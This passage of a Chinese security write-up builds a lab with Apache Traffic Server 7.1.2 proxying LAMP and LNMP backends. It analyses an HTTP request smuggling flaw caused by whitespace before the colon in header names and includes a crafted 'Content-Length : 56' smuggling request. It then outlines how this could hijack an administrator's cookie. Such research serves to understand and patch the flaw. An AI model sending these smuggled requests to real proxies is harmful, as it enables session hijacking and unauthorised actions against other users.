#### 4.2.1 简介
在这里，我们以ATS 7.1.2为例，搭建一个简单的测试环境。
环境组件介绍
    反向代理服务器
    IP: 10.211.55.22:80
    Ubuntu 16.04
    Apache Traffic Server 7.1.2
    后端服务器1-LAMP
    IP: 10.211.55.2:10085
    Apache HTTP Server 2.4.7
    PHP 5.5.9
    后端服务器2-LNMP
    IP: 10.211.55.2:10086
    Nginx 1.4.6
    PHP 5.5.9
环境拓扑图
Apache Traffic Server
一般用作HTTP代理和缓存服务器，在这个测试环境中，我将其运行在了本地的Ubuntu虚拟机中，把它配置为后端服务器LAMP&LNMP的反向代理，然后修改本机HOST文件，将域名`ats.mengsec.com`和`lnmp.mengsec,com`解析到这个IP，然后在ATS上配置映射，最终实现的效果就是，我们在本机访问域名`ats.mengsec.com`通过中间的代理服务器，获得LAMP的响应，在本机访问域名`lnmp.mengsec,com`，获得LNMP的响应。
为了方便查看请求的数据包，我在LNMP和LAMP的Web目录下都放置了输出请求头的脚本。
LNMP:
    ';
    if (!function_exists('getallheaders')) {
        function getallheaders() {
            $headers = array();
            foreach ($_SERVER as $name => $value) {
                if (substr($name, 0, 5) == 'HTTP_') {
                    $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;
                }
            }
            return $headers;
        }
    }
    var_dump(getallheaders());
    $data = file_get_contents("php://input");
    print_r($data);
LAMP:
    ';
    var_dump(getallheaders());
    $data = file_get_contents("php://input");
    print_r($data);
#### 4.2.2 搭建过程
在GIthub上下载源码编译安装ATS。
    https://github.com/apache/trafficserver/archive/7.1.2.tar.gz
安装依赖&常用工具。
    apt-get install -y autoconf automake libtool pkg-config libmodule-install-perl gcc libssl-dev libpcre3-dev libcap-dev libhwloc-dev libncurses5-dev libcurl4-openssl-dev flex tcl-dev net-tools vim curl wget
然后解压源码，进行编译&安装。
    autoreconf -if
    ./configure --prefix=/opt/ts-712
    make
    make install
安装完毕后，配置反向代理和映射。
编辑`records.config`配置文件，在这里暂时把ATS的缓存功能关闭。
    vim /opt/ts-712/etc/trafficserver/records.config
    CONFIG proxy.config.http.cache.http INT 0 # 关闭缓存
    CONFIG proxy.config.reverse_proxy.enabled INT 1 # 启用反向代理
    CONFIG proxy.config.url_remap.remap_required INT 1 # 限制ats仅能访问map表中映射的地址
    CONFIG proxy.config.http.server_ports STRING 80 80:ipv6 # 监听在本地80端口
编辑`remap.config`配置文件，在末尾添加要映射的规则表。
    vim /opt/ts-712/etc/trafficserver/remap.config
    map http://lnmp.mengsec.com/ http://10.211.55.2:10086/
    map http://ats.mengsec.com/ http://10.211.55.2:10085/
配置完毕后重启一下服务器使配置生效，我们可以正常访问来测试一下。
为了准确获得服务器的响应，我们使用管道符和`nc`来与服务器建立链接。
    printf 'GET / HTTP/1.1\r\n'\
    'Host:ats.mengsec.com\r\n'\
    '\r\n'\
    | nc 10.211.55.22 80
可以看到我们成功的访问到了后端的LAMP服务器。
同样的可以测试，代理服务器与后端LNMP服务器的连通性。
    printf 'GET / HTTP/1.1\r\n'\
    'Host:lnmp.mengsec.com\r\n'\
    '\r\n'\
    | nc 10.211.55.22 80
### 4.3 漏洞测试
来看下四个补丁以及它的描述
>  # 3192
> 如果字段名称后面和冒号前面有空格，则返回400 
> # 3201 当返回400错误时，关闭链接  #
> 3231 验证请求中的Content-Length头
>  # 3251 当缓存命中时，清空请求体
#### 4.3.1 第一个补丁
>  # 3192
> 如果字段名称后面和冒号前面有空格，则返回400
看介绍是给ATS增加了`RFC7230`第`3.2.4`章的实现，
> 
在其中，规定了HTTP的请求包中，请求头字段与后续的冒号之间不能有空白字符，如果存在空白字符的话，服务器必须返回`400`，从补丁中来看的话，在ATS
7.1.2中，并没有对该标准进行一个详细的实现。当ATS服务器接收到的请求中存在请求字段与`:`之间存在空格的字段时，并不会对其进行修改，也不会按照RFC标准所描述的那样返回`400`错误，而是直接将其转发给后端服务器。
而当后端服务器也没有对该标准进行严格的实现时，就有可能导致HTTP走私攻击。比如Nginx服务器，在收到请求头字段与冒号之间存在空格的请求时，会忽略该请求头，而不是返回`400`错误。
在这时，我们可以构造一个特殊的HTTP请求，进行走私。
    GET / HTTP/1.1
    Host: lnmp.mengsec.com
    Content-Length : 56
    GET / HTTP/1.1
    Host: lnmp.mengsec.com
    attack: 1
    foo: 
很明显，请求包中下面的数据部分在传输过程中被后端服务器解析成了请求头。
来看下Wireshark中的数据包，ATS在与后端Nginx服务器进行数据传输的过程中，重用了TCP连接。
只看一下请求，如图所示：
阴影部分为第一个请求，剩下的部分为第二个请求。
在我们发送的请求中，存在特殊构造的请求头`Content-Length : 56`，56就是后续数据的长度。
    GET / HTTP/1.1\r\n
    Host: lnmp.mengsec.com\r\n
    attack: 1\r\n
    foo: 
在数据的末尾，不存在`\r\n`这个结尾。
当我们的请求到达ATS服务器时，因为ATS服务器可以解析`Content-Length :
56`这个中间存在空格的请求头，它认为这个请求头是有效的。这样一来，后续的数据也被当做这个请求的一部分。总的来看，对于ATS服务器，这个请求就是完整的一个请求。
    GET / HTTP/1.1\r\n
    Host: lnmp.mengsec.com\r\n
    Content-Length : 56\r\n
    \r\n
    GET / HTTP/1.1\r\n
    Host: lnmp.mengsec.com\r\n
    attack: 1\r\n
    foo: 
ATS收到这个请求之后，根据Host字段的值，将这个请求包转发给对应的后端服务器。在这里是转发到了Nginx服务器上。
而Nginx服务器在遇到类似于这种`Content-Length :
56`的请求头时，会认为其是无效的，然后将其忽略掉。但并不会返回400错误，对于Nginx来说，收到的请求为
    GET / HTTP/1.1\r\n
    Host: lnmp.mengsec.com\r\n
    \r\n
    GET / HTTP/1.1\r\n
    Host: lnmp.mengsec.com\r\n
    attack: 1\r\n
    foo: 
因为最后的末尾没有`\r\n`，这就相当于收到了一个完整的GET请求和一个不完整的GET请求。
完整的：
    GET / HTTP/1.1\r\n
    Host: lnmp.mengsec.com\r\n
    \r\n
不完整的：
    GET / HTTP/1.1\r\n
    Host: lnmp.mengsec.com\r\n
    attack: 1\r\n
    foo: 
在这时，Nginx就会将第一个请求包对应的响应发送给ATS服务器，然后等待后续的第二个请求传输完毕再进行响应。
当ATS转发的下一个请求到达时，对于Nginx来说，就直接拼接到了刚刚收到的那个不完整的请求包的后面。也就相当于
    GET / HTTP/1.1\r\n
    Host: lnmp.mengsec.com\r\n
    attack: 1\r\n
    foo: GET / HTTP/1.1\r\n
    Host: 10.211.55.2:10086\r\n
    X-Forwarded-For: 10.211.55.2\r\n
    Via: http/1.1 mengchen-ubuntu[3ff3687d-fa2a-4198-bc9a-0e98786adc62] (ApacheTrafficServer/7.1.2)\r\n
然后Nginx将这个请求包的响应发送给ATS服务器，我们收到的响应中就存在了`attack: 1`和`foo: GET /
HTTP/1.1`这两个键值对了。
那这会造成什么危害呢？可以想一下，如果ATS转发的第二个请求不是我们发送的呢？让我们试一下。
假设在Nginx服务器下存在一个`admin.php`，代码内容如下：
    <?php
    if(isset($_COOKIE['admin']) && $_COOKIE['admin'] == 1){
        echo "You are Admin\n";
        if(isset($_GET['del'])){
            echo 'del user ' . $_GET['del'];
        }
    }else{
        echo "You are not Admin";
    }
由于HTTP协议本身是无状态的，很多网站都是使用Cookie来判断用户的身份信息。通过这个漏洞，我们可以盗用管理员的身份信息。在这个例子中，管理员的请求中会携带这个一个`Cookie`的键值对`admin=1`，当拥有管理员身份时，就能通过GET方式传入要删除的用户名称，然后删除对应的用户。
在前面我们也知道了，通过构造特殊的请求包，可以使Nginx服务器把收到的某个请求作为上一个请求的一部分。这样一来，我们就能盗用管理员的Cookie了。